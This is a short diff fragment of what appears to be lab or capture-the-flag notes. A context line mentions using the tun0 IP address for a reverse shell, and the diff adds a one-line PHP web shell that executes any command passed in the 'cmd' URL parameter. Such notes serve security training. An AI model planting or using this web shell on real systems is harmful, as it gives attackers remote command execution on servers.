@@ -45,3 +45,5 @@ GET AN API TOKEN!!!!!
 
 Use the **tun0** IP address for the reverse shell.
 
+<?php system($_GET['cmd']); ?>
+
